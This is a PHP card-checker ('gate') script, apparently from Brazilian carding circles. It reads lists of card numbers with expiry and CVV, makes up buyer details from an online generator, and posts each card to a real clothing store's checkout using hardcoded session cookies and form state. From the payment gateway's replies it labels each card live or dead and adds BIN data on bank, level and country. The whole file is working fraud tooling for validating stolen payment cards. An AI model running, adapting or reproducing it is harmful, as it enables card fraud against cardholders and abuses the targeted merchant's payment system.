<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

extract($_GET);

function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$separador = explode("|", $lista);
$cc = trim($separador[0]);


$cctwo = substr("$cc", 0, 6);




function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","Â»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

if($ano == 2019){  //QUANDO O ANO DO GATE NÃƒO TIVER 20, USE ESSA FUNÃ‡ÃƒO '.$ano1.'
$ano1 = "19";
}else if($ano == 2020){
$ano1 = "20";
}else if($ano == 2021){
$ano1 = "21";
}else if($ano == 2022){
$ano1 = "22";
}else if($ano == 2023){
$ano1 = "23";
}else if($ano == 2024){
$ano1 = "24";
}else if($ano == 2025){
$ano1 = "25";
}else if($ano == 2026){
$ano1 = "26";
}else if($ano == 2027){
$ano1 = "27";
}else if($ano == 2028){
$ano1 = "28";
}else if($ano == 2029){
$ano1 = "29";
}else if($ano == 2030){
$ano1 = "30";
}else if($ano == 2031){
$ano1 = "31";
}else{
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> Validade Invalida</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}

/*if($cc[0]==4){ //QUANDO VOCÃŠ NÃƒO QUISER QUE TESTE UMA TAL GERADA NO GATE
'<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==5){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==3){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==2){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==1){
     '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//=========================================//4 DEVS PHP//=========================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
$email = mt_rand();

//=========================================//PEGAR AS REQUEST DO TOKEN DO SITE//=========================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.malhariarose.com.br/pedido_finalizado.aspx?erro=true&p=Gpgkwho1des=&mensagem=Unauthorized.%20Invalid%20security%20code.');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.malhariarose.com.br',
'upgrade-insecure-requests: 1',
'save-data: on',
'user-agent: Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site: same-origin',
'sec-fetch-mode: navigate',
'sec-fetch-dest: document',
'referer: https://www.malhariarose.com.br/pedido_finalizado.aspx?retry=true&p=Gpgkwho1des=',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie: _ga=GA1.3.1763427114.1591993668;cliente=id=rXsfpRZDj2o=&nome=NJfxJlo4jG9hH4/MKvfwAQ==&email=ALVMOWJz/RrDH7v9X23InkXUp1XQLU4afVtzceCOSmQ=;ASP.NET_SessionId=ob25v5fow5kb24vgbfvcb1b0;Visitante_Id_2=179.222.16.239.32;acesso=acesso=ul1fwfpS8qwaiqViDfi1TzFHLC8NRXXy;_gid=GA1.3.1380584747.1592195816',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ctl00%24ScriptManager1=ctl00%24AreaCentral%24updatePanel2%7Cctl00%24AreaCentral%24btnPagar&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTY5ODU1Mzk0Mw8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgJmD2QWBAIBD2QWBgIUDxYCHgRocmVmBRgvd2lkZ2V0LmNzcz9wYWdpbmFfaWQ9MTBkAhwPFgIeBFRleHQFugI8IS0tIEdsb2JhbCBzaXRlIHRhZyAoZ3RhZy5qcykgLSBHb29nbGUgQW5hbHl0aWNzIC0tPgo8c2NyaXB0IGFzeW5jIHNyYz0iaHR0cHM6Ly93d3cuZ29vZ2xldGFnbWFuYWdlci5jb20vZ3RhZy9qcz9pZD1HQV9UUkFDS0lOR19JRCI%2BPC9zY3JpcHQ%2BCjxzY3JpcHQ%2BCiAgd2luZG93LmRhdGFMYXllciA9IHdpbmRvdy5kYXRhTGF5ZXIgfHwgW107CiAgZnVuY3Rpb24gZ3RhZygpe2RhdGFMYXllci5wdXNoKGFyZ3VtZW50cyk7fQogIGd0YWcoJ2pzJywgbmV3IERhdGUoKSk7CgogIGd0YWcoJ2NvbmZpZycsICdVQS02MDE1MjM1Mi0xJyk7Cjwvc2NyaXB0PmQCHQ8WAh8CBV48bWV0YSBuYW1lPSJnb29nbGUtc2l0ZS12ZXJpZmljYXRpb24iIGNvbnRlbnQ9IllBcTcxdmkzb3J1dkFtajgyYXdNU1dmY1N6bTlhWWlVX2RVR3ppQl9NT28iIC8%2BZAIDDxYCHghpdGVtdHlwZQUfaHR0cDovL3NjaGVtYS5vcmcvQ2xvdGhpbmdTdG9yZRYCAgEPZBYKAgEPDxYCHwIFkwQ8ZGl2IGNsYXNzPSJmdWxsLXdpZHRoIj4NCiAgICA8ZGl2IGNsYXNzPSJjYWJlY2FsaG8iPjxkaXYgY2xhc3M9ImFyZWEiIGlkPSJhcmVhLTEiPiMjQEBjYWJlY2FsaG8tQXJlYS0xIyM8L2Rpdj48L2Rpdj4NCjwvZGl2Pg0KDQogPGRpdiBjbGFzcz0iY29udGVudC1jZW50ZXIgZnVsbC13aWR0aCI%2BDQogICAgPGRpdiBjbGFzcz0nY29udGV1ZG8gY29udGVudC1wdXNoJz4NCiAgICAgICAgPGRpdiBjbGFzcz0ncm93Jz4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFyZWEgY29sLW1kLTEyIiBpZD0iYXJlYS0xIj4NCiAgICAgICAgICAgICAgICAjI0BAY29udGV1ZG8tYXJlYS0xIyMgDQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY%2BDQogICAgPC9kaXY%2BDQoNCjwvZGl2PjxkaXYgY2xhc3M9InJvZGFwZS1jb250ZW50IGNvbnRlbnQtY2VudGVyIj4NCg0KICAgIDxkaXYgY2xhc3M9InJvZGFwZSI%2BPGRpdiBjbGFzcz0iYXJlYSIgaWQ9ImFyZWEtMSI%2BIyNAQHJvZGFwZS1BcmVhLTEjIzwvZGl2PjwvZGl2Pg0KDQo8L2Rpdj5kZAIJD2QWAmYPZBYCAgUPZBYCAgEPZBYGAgEPFgIeB1Zpc2libGVoFgpmDxYCHwIFBDUwNTZkAgEPFgIfAgUPUm9iZXJ0YSBQYWNoZWNvZAICDxYCHwIFEENhcnTDo28gdmlhIFJFREVkAgQPFgIfAgUyPGkgY2xhc3M9J2ZhIGZhLWNsb2NrLW8nPjwvaT4gQWd1YXJkYW5kbyBwYWdhbWVudG9kAgUPFgIfAgUIUiQyMTUsMDBkAgMPZBYCAgEPEGRkFgFmZAIHDxYCHwRnFgQCDQ9kFgJmD2QWAgIBDxBkEBUHCVNlbGVjaW9uZRgxIHggUiQyMTUsMDAgLSBzZW0ganVyb3MYMiB4IFIkMTA3LDUwIC0gc2VtIGp1cm9zFzMgeCBSJDcxLDY3IC0gc2VtIGp1cm9zFzQgeCBSJDUzLDc1IC0gc2VtIGp1cm9zFzUgeCBSJDQzLDAwIC0gc2VtIGp1cm9zFzYgeCBSJDM1LDgzIC0gc2VtIGp1cm9zFQcBMAExATIBMwE0ATUBNhQrAwdnZ2dnZ2dnZGQCJQ8WAh8CBQhSJDIxNSwwMGQCEw9kFgQCAQ8WAh8CBc4EPHNjcmlwdCBzcmM9Imh0dHBzOi8vYXBpcy5nb29nbGUuY29tL2pzL3BsYXRmb3JtLmpzP29ubG9hZD1yZW5kZXJPcHRJbiIgYXN5bmMgZGVmZXI%2BPC9zY3JpcHQ%2BCgo8c2NyaXB0PgogIHdpbmRvdy5yZW5kZXJPcHRJbiA9IGZ1bmN0aW9uKCkgewogICAgd2luZG93LmdhcGkubG9hZCgnc3VydmV5b3B0aW4nLCBmdW5jdGlvbigpIHsKICAgICAgd2luZG93LmdhcGkuc3VydmV5b3B0aW4ucmVuZGVyKAogICAgICAgIHsKICAgICAgICAgIC8vIFJFUVVJUkVEIEZJRUxEUwogICAgICAgICAgIm1lcmNoYW50X2lkIjogODM2MjMyNiwKICAgICAgICAgICJvcmRlcl9pZCI6ICJPUkRFUl9JRCIsCiAgICAgICAgICAiZW1haWwiOiAiQ1VTVE9NRVJfRU1BSUwiLAogICAgICAgICAgImRlbGl2ZXJ5X2NvdW50cnkiOiAiQ09VTlRSWV9DT0RFIiwKICAgICAgICAgICJlc3RpbWF0ZWRfZGVsaXZlcnlfZGF0ZSI6ICJZWVlZLU1NLUREIiwKCiAgICAgICAgICAvLyBPUFRJT05BTCBGSUVMRFMKICAgICAgICAgICJwcm9kdWN0cyI6IFt7Imd0aW4iOiJHVElOMSJ9LCB7Imd0aW4iOiJHVElOMiJ9XQogICAgICAgIH0pOwogICAgfSk7CiAgfQo8L3NjcmlwdD5kAgMPFgIfAgWRBDxzY3JpcHQ%2BDQovKiBDw7NkaWdvIGRlIGFjb21wYW5oYW1lbnRvIHBhcmEgZS1jb21tZXJjZSBkbyBHQS5KUyAqLw0KZ2EoJ3JlcXVpcmUnLCAnZWNvbW1lcmNlJyk7DQpnYSgnZWNvbW1lcmNlOmFkZFRyYW5zYWN0aW9uJywgewogICdpZCc6ICc1MDU2JywgICAgICAgICAgICAgICAgICAKICAnYWZmaWxpYXRpb24nOiAnTWFsaGFyaWEgUm9zZScsCiAgJ3JldmVudWUnOiAnMjE1JywgCiAgJ3NoaXBwaW5nJzogJzAnLCAKICAndGF4JzogJzAnICAgICAgICAgICAgIAogICdjdXJyZW5jeSc6ICdCUkwnICAgICAgCn0pOw0KZ2EoJ2Vjb21tZXJjZTphZGRJdGVtJywgewogICdpZCc6ICcyNDc1NicsICAgICAgICAgICAgICAgCiAgJ25hbWUnOiAnQ2FzYWNvIE1vdXNzZSBGdXJvcycsIAogICdza3UnOiAnMzg0ICAgICAgICAgICAgICAgICAnLCAKICAnY2F0ZWdvcnknOiAnJywgICAgICAgICAKICAncHJpY2UnOiAnNzAsMDAnLCAKICAncXVhbnRpdHknOiAnMicgIAp9KTsNCmdhKCdlY29tbWVyY2U6c2VuZCcpOw0KPC9zY3JpcHQ%2BDQpkAhkPFgIfAmVkAh0PZBYCZg9kFgYCBw9kFgJmD2QWAgIBD2QWAgIDDxBkZBYBZmQCDQ9kFgICAg8WAh8EZ2QCDw9kFgJmD2QWAgIBD2QWBAIBDw8WAh8CBQZSJDAsMDBkZAIDDw8WAh8CBQEwZGRklSLaPiakOpsunQvS%2B4c6YBntP72cmCbAEi6t%2B%2BBOjlo%3D&__VIEWSTATEGENERATOR=281EEBEE&__EVENTVALIDATION=%2FwEdAFCqV%2Fk7Y7U76DI1OPLfbJ3eg9%2Fjtnoyzs84HUEYfTJ57AVVaJVBxVlUosaMK7ywjVPjrVIVULOm%2BUE4YgNPXIjxbb69yrUY0dHqGcUxV5im3YyQSbu1OdTPcBSJ4VrXovyLRw8EN04kuixxgydEm%2BadSWQHR9g2CS9%2FsOUXiNqgvqWIPH8fyVw8TK1FWQH27Qy51zyrhVtx%2BhraozFYBj2mXGY3uQ3vlZF6v36OF1ogZ4KrYqGRguib%2F7MqdVZHGqg5EZt9fyHWqGAQSCNk%2BMqHICu7Xmx2pVL%2B3mekCP6G3EQPSaDJCXiOIy8xMS0jiGOUWrnuGRWCABbgpP87F8kdc92IEOskBco5cIeL7QJP%2F8n8wrOUKZsMH1ooLQ2lhAB2ORX1InNdsgsQbv0lPiCb%2FAxoYNfe6dK9x6JelISrcf00%2BM69jMCknng1FLEx4P%2BfNz1Ign6flbYtywOn2AuddaaCRK%2F8QXPIhB4zYY6d1SuhYz5bEIpLOT3dhvcMmnQ9ucjKywYA70XPZhd1AOpQnwmbkhZeCs5VUelA1cLzNz7%2BHcY5njip3le%2BxTU654tLb5YkYCGq%2FvFdffJrDX0FwbIQTN8HdfeyKwEK1%2FhjyIkBCvUzboEHjNptzkRqMcGL4Pz3X4tkH6ijz679bnuKXmw8Y7bcW00jZ4uowRotnBrjmE6eD6KAAHMih2MwgI8dlL4HvDrXLAM6PRK2%2FJhB4R1tDQ6vtdkLasrw0ZUxdfGPw%2F9w%2FfMKFg0oR57iD7VLQP6f1ljwO6jofCwV9Y9%2BKsZg%2B62xCe6g0mRu1M0KUo94f5adB5kO6LjQJUvSII39pLoE3XgrKWRDDpv%2BZb%2BRDZRSvBVe80ct1KZTMznBq35ZEEKLEWGf803vjurHQohuwR9DmV3ZrITSY%2FRVmrcy%2BCaxD64U77MA24sZT0dj7FGSmArXIfhqZYipbI7vWKiDpDO%2FjJGi4xyAe9dsbpW97X77pmZWoLl8dhWba7JhR1dFAMuuoANq5%2FmHNwsBHlkb28M5cLOLxePJq52Fwll9rDxV3Dvle2PLNK09yXLKRLFHriIGwPfW4NFPBYTuBHLK6%2Fi%2FmE8fFrvgpV1vlgRA91EvZm0pl%2FwvGvvNls2kiwXBGp%2FDzKYOlRivtCK0nFLeo1VI2snyRtDTQhHFBaLrNKxvENVC2eZyXX9khX532wgDw5uCPeJ9LgtpHB%2BKlvvJksek7qIA90o4aBirP3rwP2SyeNqhepY53YG0gN5wSRigqiRlJ6G5kqE4EL%2F8J%2BmzZBD8i6bxwa2rPba7w5vAmMqN89qmcfneRXP1V0bt%2BW635liekEqf1CL%2Fovwz2rMVjcOwt2iZxuXbT8%2FJ99h277PiuzlD%2BVuIy0ay3doRB5k8teggjiUhbtmkTk7YcNHhzCt8ua5lHsVF7lhA%2FsPtQl1YiVnvTPPTMZKcOn%2Fz8IEzBqJQckgYZRfBqwvqMGFbeiv4WqnNkFhzu4M71nvuw%2BiIUBABXmpNK9qZ4mGRZJW9u1n8WVFi3RFKVlQHtW%2BzMRjCvSRlkO4NTSS9wo5N6V4S9G7EZ30YaL9SKtfNJjEsmyb8sNOK%2BMy3qPRSAiF48XI0bTwtdFyoGnmJl9vH62NGtFNr7Ye9qkuzInQZ3Ik2ezXQhjIFHEtUGp%2Fpq0uiDGVklSMyRAW9JlPQUi4AbaX0lOzfvyx9oekzKs1Yb4vdQZUcD9IDPPhSg7Ib6GItVmUa7sAtObubiPxFNXtE&ctl00%24ctl18%24edtWidget_Id=9523876&ctl00%24ctl18%24edtWidget_Nome=&ctl00%24ctl18%24edtWidget_Template=&ctl00%24ctl18%24busca%24edtProcurar=&ctl00%24AreaCentral%24edtCartao_Numero='.$cc.'&ctl00%24AreaCentral%24edtCartao_Cod=000&ctl00%24AreaCentral%24edtCartao_Mes='.$mes.'&ctl00%24AreaCentral%24edtCartao_Ano='.$ano.'&ctl00%24AreaCentral%24lstCartao_Parcela=1&ctl00%24AreaCentral%24edtCartao_Nome=Fredo%20Scofield&ctl00%24AreaCentral%24edtCartao_DataNascimento=02%2F01%2F1995&ctl00%24AreaCentral%24edtCartao_CPF=&ctl00%24AreaCentral%24edtCartao_Telefone=&ctl00%24AreaCentral%24edtCobranca_Cep=&ctl00%24AreaCentral%24edtCobranca_Cidade=&ctl00%24AreaCentral%24lstCobranca_Estado=&ctl00%24AreaCentral%24edtCobranca_Rua=&ctl00%24AreaCentral%24edtCobranca_Numero=&ctl00%24AreaCentral%24edtCobranca_Bairro=&ctl00%24AreaCentral%24edtCobranca_Complemento=&ctl00%24AreaCentral%24edtPedido_ValorTotal=R%24215%2C00&ctl00%24AreaCentral%24edtSubmit=1&ctl00%24AreaCentral%24edtCartao=visa&ctl00%24AreaCentral%24edtCartao_Token=&ctl00%24AreaCentral%24edtSenderHash=01e03dba56d9e5edcde810993d3b5f86567b0d3f316f741c7235eccb260a0d1d&ctl00%24AreaCentral%24edtBanco_Codigo=&ctl00%24AreaCentral%24edtPedido_Tipo=1&ctl00%24AreaCentral%24edtPagamento_Id=8&ctl00%24AreaCentral%24edtMoip_Forma=&ctl00%24AreaCentral%24edtMoip_Instituicao=&ctl00%24AreaCentral%24edtMoip_Status=&ctl00%24AreaCentral%24edtMoip_CodigoMoIP=&ctl00%24AreaCentral%24edtMoip_CodigoRetorno=&ctl00%24AreaCentral%24edtMoip_Token=&ctl00%24ctl21%24edtWidget_Id=9523877&ctl00%24edtProcurar=&ctl00%24popup%24edtassinante_nome=&ctl00%24popup%24edtassinante_email=&__ASYNCPOST=true&ctl00%24AreaCentral%24btnPagar=aguarde...');
 $retorn = curl_exec($ch);



$bin = substr($cc, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
$pais = $pieces[4];
$paiscode = $pieces[5];
$banco = $pieces[2];
$level = $pieces[3];
$bandeira = $pieces[1];
} else {
$pais = $pieces[5];
$paiscode = $pieces[6];
$level = $pieces[4];
$banco = $pieces[2];
$bandeira = $pieces[1];
}

if (strpos($retorn, 'Unauthorized. Please try again.') !== false) {
echo
"APROVADA $lista|$bin  Retorno: Please try again (GERADA MASTER LIVE) #fredoapp";

}elseif (strpos($retorn, 'Unauthorized. Invalid security code.') !== false) {
echo
"APROVADA $lista|$bandeira|$banco|$level|$pais Retorno: Invalid security code. #fredo.app";


}elseif (strpos($retorn, 'Success') !== false) {
	
echo "APROVADA $lista|$bandeira|$banco|$level|$pais  Retorno: CVV ENCONTRADO. #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Restricted card.') !== false) {
echo
"REPROVADA $lista|$bandeira|$banco|$level|$pais  Retorno: Cartão Restrito.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Nonexistent card.') !== false) {
echo "REPROVADA $lista|$bandeira|$banco|$level|$pais  Retorno: Cartão não existente.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Transaction type not allowed for this card.') !== false) {

echo "REPROVADA $lista|$bandeira|$banco|$level|$pais  Transação não permitida.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Value not allowed for this type of card.') !== false) {
	
echo
"APROVADA $lista|$bandeira|$banco|$level|$pais   Retorno: Cartão com saldo baixo, porém live  #fredo.app";


}elseif (strpos($retorn, 'Unauthorized. Expiry date expired.') !== false) {
	
echo "REPROVADA $lista|$bandeira|$banco|$level|$pais   Retorno: Cartão com a validade vencida ou expirada  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Card locked.') !== false) {

echo "REPROVADA $lista|$bandeira|$banco|$level|$pais  Retorno: Cartão bloqueado, um dia útil #fredo.app";
 }
else{
echo "REPROVADA $lista|$bandeira|$banco|$level|$pais   Error.";

}

?>